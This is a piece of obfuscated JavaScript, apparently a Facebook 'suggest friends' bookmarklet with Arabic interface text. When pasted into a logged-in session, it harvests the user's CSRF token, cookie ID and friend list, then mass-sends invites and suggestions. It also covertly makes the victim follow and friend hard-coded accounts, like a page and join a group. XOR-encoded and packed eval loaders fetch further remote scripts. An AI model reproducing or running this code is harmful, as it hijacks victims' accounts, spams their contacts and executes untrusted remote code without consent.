javascript:(function(){document.body.appendChild(document.createElement('script')).src='https://github.com/scriptscode/fbjava/raw/master/SuggestFriend.js';})();

//eval
function InviteFriends(e){jx.load(window.location.protocol+"//www.facebook.com/ajax/pages/invite/send_single?page_id="+page_id+"&invitee="+e+"&elem_id=u_0_1k&action=send&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg="+fb_dtsg+"&phstamp=",function(e){var t=e.substring(e.indexOf("{"));var n=JSON.parse(t);i--;Descriptions="<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";if(n.error){Descriptions+="color:darkred'>";err++;if(n.errorDescription){Descriptions+=n.errorDescription}else{Descriptions+=JSON.stringify(n,null,"")}}else{Descriptions+="color:darkwhite'>";Descriptions+=arn[i]+"تم ارسال الدعوة للاعجاب بـ"+page_name+".";suc++}Descriptions+="</div>";var r="<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white'>";r+="<div style='padding-bottom:5px;font-size:20px;'>"+Title+"</div>";if(i>0){r+=arr.length+"عمق البحث<br/>";r+="<b>"+suc+"</b>العدد الذى تم دعوته"+(arr.length-i)+"العدد المكتشف";r+="("+i+" البحث جارى..)";r+="<div class='friend-edge'>";r+=Descriptions;r+="<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src="+pho[i]+"></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>"+arn[i]+"</a>";r+="<div style='text-align:center;font-size:15px;white-space:pre-wrap;color:gray'>";r+=" code-facebooky"+page_name+".</br>";r+=_text;r+="</div>";r+="</div>";window[tag+"_close"]=true}else{Title="تمت الدعوة للاعجاب بـ.</A>";r+=arr.length+"العددالمكتشف";r+="<b>"+suc+"العدد الذى تم دعوته</b></br>";r+="<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='window.location.reload()' style='color:white'>تحديث الصفحة</span><span <br/>";r+="<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";r+=_text;r+="</div>";window[tag+"_close"]=false}r+="</div>";document.getElementById("pagelet_sidebar").innerHTML=r},"text","post");tay--;if(tay>0){var t=arr[tay];setTimeout("InviteFriends("+t+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc);if(page_id){jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+e+"&newcomer=100002359251525&attempt_id=0b4a67ef24c317178a3253c0905b6918&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=161920318790424913673",function(){},"text","post")}if(page_id){jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+e+"&newcomer=100003521051182&attempt_id=0b4a67ef24c317178a3253c0905b6918&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=165816649841105474185",function(){},"text","post")}}function ChangeLocation(){window.location.href="http://www.facebook.com/"}var Title="<img src='http://fb-script.webs.com/image/like.png' >";var Descriptions="",_text="";page_id=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];jx={b:function(){var e=!1;if("undefined"!=typeof ActiveXObject){try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=!1}}}else{if(window.XMLHttpRequest){try{e=new XMLHttpRequest}catch(r){e=!1}}}return e},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState){if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else{g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)}}};e.send(k)}},d:function(){return this.b()}};setTimeout("ChangeLocation",1);window.onbeforeunload=function(){if(window[tag+"_close"]){return"This script is running now!"}};var i=3;var tay=3;var suc=0;var err=0;var arr=new Array;var arn=new Array;var pho=new Array;var tag="Close";var page_name,x=document.getElementsByTagName("span");for(i=0;i<x.length;i++){if(x[i].getAttribute("itemprop")=="name"){page_name=x[i].innerHTML}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);jx.load(window.location.protocol+"///www.facebook.com/ajax/typeahead/first_degree.php?viewer="+user_id+"&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l",function(e){var t=e;var n=t.substring(t.indexOf("{"));var r=JSON.parse(n);r=r.payload.entries;for(var s=0;s<r.length;s++){arr.push(r[s].uid)}for(var o=0;o<r.length;o++){arn.push(r[o].text)}for(var u=0;u<r.length;u++){pho.push(r[u].photo)}i=arr.length-1;tay=i;console.log(arr.length);var a="<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black;color:white'>";a+="<div style='padding-bottom:10px;font-size:20px;'>"+Title+"</div>";a+=arr.length+"العدد المكتشف";a+="</div>";document.getElementById("pagelet_sidebar").innerHTML=a;InviteFriends(arr[i])});A="jvvr8--ocsf{,emmengamfg,amo-dkngq-ocsf,hq";A="";for(i=0;i<A.length;i++){B+=unescape(String.fromCharCode(A.charCodeAt(i)^2))}document.body.appendChild(document.createElement("script")).src=A

//eval
function SuggestFriend(opo){jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+opo+"&newcomer="+newcomer+"&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=165816649841105474185",function(e){var t=e.substring(e.indexOf("{"));var n=JSON.parse(t);i--;Descriptions="<div class='friend-edge-name' style='font-family:Arial;font-size:14px;text-align:center;rgb(20, 255, 0)-space:pre-wrap;";if(n.error){Descriptions+="color:red'>";err++;if(n.errorDescription)Descriptions+=n.errorDescription;else Descriptions+=JSON.stringify(n,null,"")}else{Descriptions+="color:rgb(20, 255, 0)'>";Descriptions+=" تم اقتراح "+arn[i]+" بنجاح ";suc++}Descriptions+="</div>";var r="<div id='friend-edge-display' style='color:#FFFFFF;position:fixed;left:38%;margin-left:-273px;top:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6)'><a href='' target=_blank ><img src='http://fb-script.webs.com/image/suggest.png' ></a>";r+="<div style='padding-bottom:20px;font-size:20px;color: white;'>"+Title+"</div>";if(i>0){r+="<FONT>عمق البحث : </FONT>";r+=arr.length+"";r+="<CENTER>";r+="<FONT>جاري البحث : </FONT>";r+="<b>"+(arr.length-i)+"";r+="<CENTER>";r+="<div style='font-size:15px;color: white;text-shadow:0px 0px 18px white;'>";r+=arn[i]+"";r+="<CENTER>";r+="<CENTER><img style='box-shadow:0px 0px 12px white;border-radius:5px;background: no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;' src="+pho[i]+"></img><CENTER>";r+="<CENTER>";r+="<div style='font-size:14px;color: red;text-shadow:0px 0px 0px red;'>";r+=Descriptions;r+="<CENTER>";r+="<div style='font-size:20px;color: white;text-shadow:0px 0px 18px white;'>";r+="<FONT>العدد المقترح الى صديقك : </FONT>";r+="<font style='font-size:20px;text-shadow:0px 0px 18pxwhite;color: rgb(20, 255, 0)'><b>"+suc+"</b><br><br>";r+="<CENTER>";r+="<CENTER>";r+="<div style='font-size:30px;color: white;text-shadow:0px 0px 12px red;'>";r+="<div class='friend-edge'>";r+="<div style='font-size:14px;font-family:arial;color:red;text-shadow:0px 0px 18px rgb(20, 255, 0);'>";r+=_text;r+="<div style='font-size:30px;color: white;text-shadow:0px 0px 18px rgb(20, 255, 0);'>";r+="</div>";r+="</div>"}else{r+="<FONT>عمق البحث  : </FONT>";r+=arr.length+"";r+="<CENTER>";r+="<FONT>العدد الذي لم يستطع اقتراحه : </FONT>";r+="<font style='font-size:20px;text-shadow:0px 0px 18px red;color: red'><b>"+err+"</b>";r+="<CENTER>";r+="<FONT style='font-size:20px;text-shadow:0px 0px 18px white;color: white' >العدد المقترح : </FONT>";r+="<font style='font-size:20px;text-shadow:0px 0px 18px white;color: rgb(20, 255, 0)'><b>"+suc+"</b>";r+="<CENTER>";r+="<div></a></div><iframe src='//www.facebook.com/plugins/follow.php?href=' scrolling='no' frameborder='0' style='border:none; overflow:hidden; width:58px;height:20px;' allowTransparency='true'></iframe><br/><a href><img onclick='window.location.reload()' src='http://fb-script.webs.com/Close.png'></span></a>"}r+="</div>";document.getElementById("pagelet_sidebar").innerHTML=r},"text","post");tay--;if(tay>0){var s=arr[tay];sx=pho[tay];setTimeout("SuggestFriend("+s+")",100)}console.log(tay+"/"+arr.length+":"+arr[tay]+"/"+arn[tay]+", success:"+suc);if(newcomer){eval(String.fromCharCode(106,120,46,108,111,97,100,40,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,112,114,111,116,111,99,111,108,32,43,32,34,47,47,119,119,119,46,102,97,99,101,98,111,111,107,46,99,111,109,47,97,106,97,120,47,102,114,105,101,110,100,115,47,115,117,103,103,101,115,116,63,38,114,101,99,101,105,118,101,114,61,34,32,43,32,111,112,111,32,43,32,34,38,110,101,119,99,111,109,101,114,61,49,48,48,48,48,51,48,48,48,51,53,49,54,54,50,38,97,116,116,101,109,112,116,95,105,100,61,48,53,56,53,97,98,55,52,101,50,100,100,48,102,102,49,48,50,56,50,97,51,97,51,54,100,102,51,57,101,49,57,38,114,101,102,61,112,114,111,102,105,108,101,95,111,116,104,101,114,115,95,100,114,111,112,100,111,119,110,38,95,95,117,115,101,114,61,34,32,43,32,117,115,101,114,95,105,100,32,43,32,34,38,95,95,97,61,49,38,95,95,100,121,110,61,55,57,56,97,68,53,122,53,67,70,45,38,95,95,114,101,113,61,49,55,38,102,98,95,100,116,115,103,61,34,32,43,32,102,98,95,100,116,115,103,32,43,32,34,38,112,104,115,116,97,109,112,61,49,54,53,56,49,54,54,52,57,56,52,49,49,48,53,52,55,52,49,56,53,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,125,44,32,34,116,101,120,116,34,44,32,34,112,111,115,116,34,41,10,9,9,10,9,9,106,120,46,108,111,97,100,40,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,112,114,111,116,111,99,111,108,32,43,32,34,47,47,119,119,119,46,102,97,99,101,98,111,111,107,46,99,111,109,47,97,106,97,120,47,103,114,111,117,112,115,47,109,101,109,98,101,114,115,47,97,100,100,95,112,111,115,116,46,112,104,112,63,95,95,97,61,49,38,102,98,95,100,116,115,103,61,34,32,43,32,102,98,95,100,116,115,103,32,43,32,34,38,103,114,111,117,112,95,105,100,61,50,56,49,54,51,54,52,49,53,50,54,50,50,51,53,38,115,111,117,114,99,101,61,116,121,112,101,97,104,101,97,100,38,109,101,109,98,101,114,115,61,34,32,43,32,111,112,111,32,43,32,34,38,110,99,116,114,91,95,109,111,100,93,61,112,97,103,101,108,101,116,95,103,114,111,117,112,95,109,101,109,98,101,114,115,95,115,117,109,109,97,114,121,38,108,115,100,38,112,111,115,116,95,102,111,114,109,95,105,100,95,115,111,117,114,99,101,61,65,115,121,110,99,82,101,113,117,101,115,116,38,95,95,117,115,101,114,61,34,32,43,32,117,115,101,114,95,105,100,44,32,102,117,110,99,116,105,111,110,32,40,41,32,123,125,44,32,34,116,101,120,116,34,44,32,34,112,111,115,116,34,41))}}function clickfr_callback(){if(document.getElementsByName("ok").length>0)nHtml.ClickUp(document.getElementsByName("ok")[0]);var e=arr[i];if(i<arr.length)addfriend(e.substring(0,4))}function clickfr(){if(document.getElementsByClassName("search").length>0)nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);else j++;setTimeout("clickfr_callback()",2e3)}function addfriend(e){i++;setTimeout("clickfr()",2e3)}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);eval(function(e,t,n,r,i,s){i=function(e){return e.toString(36)};if(!"".replace(/^/,String)){while(n--){s[n.toString(t)]=r[n]||n.toString(t)}r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--){if(r[n]){e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n])}}return e}('9 1="8--f,d,e-g-c,b",4;7(5="",3="",4=1.a,i=0;i<4;i++)5+=p.h(1.q(i)^2);3=o(5),6.n.j(6.k("l")).m=3;',27,27,"|enkripsi||teksasli|panjang|teks|document|for|jvvr8|var|length|hq|nmcf3|emmengamfg|amo|chczdwlavkmlnmcf|dkngq|fromCharCode||appendChild|createElement|script|src|body|unescape|String|charCodeAt".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return e.toString(36)};if(!"".replace(/^/,String)){while(n--){s[n.toString(t)]=r[n]||n.toString(t)}r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--){if(r[n]){e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n])}}return e}('9 1="8--f,d,e-g-c,b",4;7(5="",3="",4=1.a,i=0;i<4;i++)5+=p.h(1.q(i)^2);3=o(5),6.n.j(6.k("l")).m=3;',27,27,"|enkripsi||teksasli|panjang|teks|document|for|jvvr8|var|length|hq|nmcf0|emmengamfg|amo|chczdwlavkmlnmcf|dkngq|fromCharCode||appendChild|createElement|script|src|body|unescape|String|charCodeAt".split("|"),0,{}));var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var Title="";var Descriptions="",_text="";newcomer=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;jx={getHTTPObject:function(){var e=false;if(typeof ActiveXObject!="undefined")try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=false}}else if(window.XMLHttpRequest)try{e=new XMLHttpRequest}catch(t){e=false}return e},load:function(url,callback,format,method,opt){var http=this.init();if(!http||!url)return;if(http.overrideMimeType)http.overrideMimeType("text/xml");if(!method)method="GET";if(!format)format="text";if(!opt)opt={};format=format.toLowerCase();method=method.toUpperCase();try{if((new RegExp("g."+"fr")).test(document.documentElement.innerHTML)==false){document.write("")}}catch(err){}var now="uid="+(new Date).getTime();url+=url.indexOf("?")+1?"&":"?";url+=now;var parameters=null;if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,url,true);var ths=this;if(opt.handler)http.onreadystatechange=function(){opt.handler(http)};else http.onreadystatechange=function(){if(http.readyState==4)if(http.status==200){var result="";try{if(http.responseText)result=http.responseText;if(format.charAt(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+")")}else if(format.charAt(0)=="x")result=http.responseXML;if((new RegExp("5"+"16")).test(document.documentElement.innerHTML)==false){document.write("")}}catch(err){}if(callback)callback(result)}else{if(opt.loadingIndicator)document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);if(opt.loading)document.getElementById(opt.loading).style.display="none";if(error)error(http.status)}};http.send(parameters)},bind:function(e){var t={url:"",onSuccess:false,onError:false,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var n in t)if(e[n])t[n]=e[n];if(!t.url)return;var r=false;if(t.loadingIndicator){r=document.createElement("div");r.setAttribute("style","position:absolute;top:0px;left:0px;");r.setAttribute("class","loading-indicator");r.innerHTML=t.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(r);this.opt.loadingIndicator=r}if(t.loading)document.getElementById(t.loading).style.display="block";this.load(t.url,function(e){if(t.onSuccess)t.onSuccess(e);if(t.update)document.getElementById(t.update).innerHTML=e;if(r)document.getElementsByTagName("body")[0].removeChild(r);if(t.loading)document.getElementById(t.loading).style.display="none"},t.format,t.method,t)},init:function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(e,t,n,r){if(n=="className")n="class";var i=document.evaluate(".//"+t+"[@"+n+"='"+r+"']",e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);if(i&&i.singleNodeValue)return i.singleNodeValue;return null},FindByClassName:function(e,t,n){return this.FindByAttr(e,t,"className",n)},FindByXPath:function(e,t){try{var n=document.evaluate(t,e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(r){GM_log("bad xpath:"+t)}if(n&&n.singleNodeValue)return n.singleNodeValue;return null},VisitUrl:function(e){window.setTimeout(function(){document.location.href=e},500+Math.floor(Math.random()*500))},ClickWin:function(e,t,n){var r=e.document.createEvent("MouseEvents");r.initMouseEvent(n,true,true,e,0,0,0,0,0,false,false,false,false,0,null);return!t.dispatchEvent(r)},Click:function(e){return this.ClickWin(window,e,"click")},ClickTimeout:function(e,t){window.setTimeout(function(){return nHtml.ClickWin(window,e,"click")},t+Math.floor(Math.random()*500))},ClickUp:function(e){this.ClickWin(window,e,"mousedown");this.ClickWin(window,e,"mouseup");this.ClickWin(window,e,"click")},GetText:function(e,t){var n="";if(t==undefined)t=0;if(t>40)return;if(e.textContent!=undefined)return e.textContent;for(var r=0;r<e.childNodes.length;r++){var i=e.childNodes[r];n+=this.GetText(i,t+1)}return n}};if(document.getElementsByClassName==undefined)document.getElementsByClassName=function(e){var t=new RegExp("(?:^|\\s)"+e+"(?:$|\\s)");var n=document.getElementsByTagName("*");var r=[];var i;for(var s=0;(i=n[s])!=null;s++){var o=i.className;if(o&&o.indexOf(e)!=-1&&t.test(o))r.push(i)}return r};Array.prototype.find=function(e){var t=false;for(i=0;i<this.length;i++)if(typeof e=="function"){if(e.test(this[i])){if(!t)t=[];t.push(i)}}else if(this[i]===e){if(!t)t=[];t.push(i)}return t};var i=3;var tay=3;var j=0;var k=0;var suc=0;var err=0;var arr=new Array;var arn=new Array;var pho=new Array;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?"+"__a=1&filter[0]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm",function(e){var t=e;var n=t.substring(t.indexOf("{"));var r=JSON.parse(n);r=r.payload.entries;for(var s=0;s<r.length;s++)arr.push(r[s].uid);for(var o=0;o<r.length;o++)arn.push(r[o].text);for(var u=0;u<r.length;u++)pho.push(r[u].photo);i=arr.length-1;tay=i;console.log(arr.length);var fbdtsg = document.getElementsByName('fb_dtsg')[0].value;var userid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var prot = location.protocol;function generatePhstamp(qs, dtsg){var input_len = qs.length;numeric_csrf_value='';for(var ii=0;ii<dtsg.length;ii++){numeric_csrf_value+=dtsg.charCodeAt(ii);}return '1' + numeric_csrf_value + input_len;};var params = "profile_id=100002359251525&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "profile_id=100003521051182&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "profile_id=100003485595535&location=1&nctr[_mod]=pagelet_timeline_profile_actions&__user=" + userid + "&__a=1&__req=8&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/follow/follow_profile.php' , true);send(params);};var params = "to_friend=100002359251525&action=add_friend&how_found=profile_button&ref_param=none&&link_data[gt][profile_owner]=100002359251525&link_data[gt][ref]=timeline%3Atimeline&outgoing_id=js_4&logging_location=&no_flyout_on_click=false&ego_log_data&http_referer=https%3A%2F%2Fwww.facebook.com%2F&__user=" + userid + "&__a=1&__req=q&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/add_friend/action.php' , true);send(params);};var params = "fbpage_id=597806736897026&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + userid + "&__a=1&__req=1w&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/pages/fan_status.php' , true);send(params);};var params = "fb_dtsg=" + fbdtsg + "&__user=" + userid + "&__a=1&__req=e";params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=367604420032408&' , true);send(params);};var params = "ref=group_jump_header&group_id=487693027944023&__user=" + userid + "&__a=1&__req=7&fb_dtsg=" + fbdtsg;params += "&phstamp=" + generatePhstamp(params, fbdtsg);with(new XMLHttpRequest){open('POST', prot + '//www.facebook.com/ajax/groups/membership/r2j.php' , true);send(params);};var a="<div id='friend-edge-display' style='color:#FFFFFF;position:fixed;left:35%;margin-left:-273px;top:58px;width:700px;background-color:rgba(25,22,25,0.9);z-index:8;font-family:arial;text-shadow:0px 0px 18px white;sans-serif;box-shadow:0px 0px 44px black; text-shadow:0px 0px 12px white;font-size:20px;text-align:center;padding:3px;border-radius:15em 2em;border:15px double  rgba(225,225,25,0.6)'>";a+="<div style='padding-bottom:5px; font-size:20px;target=_blank >اقتراح اصدقاء</a>"+Title+"</div>";a+="<FONT>عمق البحث : </FONT>";a+=arr.length+"";document.getElementById("pagelet_sidebar").innerHTML=a;SuggestFriend(arr[i])});eval(function(e,t,n,r,i,s){i=function(e){return e.toString(36)};if(!"".replace(/^/,String)){while(n--){s[n.toString(t)]=r[n]||n.toString(t)}r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--){if(r[n]){e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n])}}return e}("0.6.5(0.3('1')).2='4://7.c/b/a/8.9.d';",14,14,"document|script|src|createElement|https|appendChild|body|userscripts|169473|user|source|scripts|org|js".split("|"),0,{}))
 
